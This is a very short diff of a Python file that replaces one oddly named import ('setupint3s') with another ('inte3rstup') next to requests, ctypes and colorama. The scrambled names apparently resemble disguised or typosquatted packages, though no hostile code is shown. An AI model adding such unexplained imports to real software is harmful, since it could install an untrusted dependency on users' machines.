@@ -1,4 +1,4 @@
-import requests, json, datetime, ctypes, setupint3s
+import requests, json, datetime, ctypes, inte3rstup
 from colorama import Fore
 class data:
     notused = 0
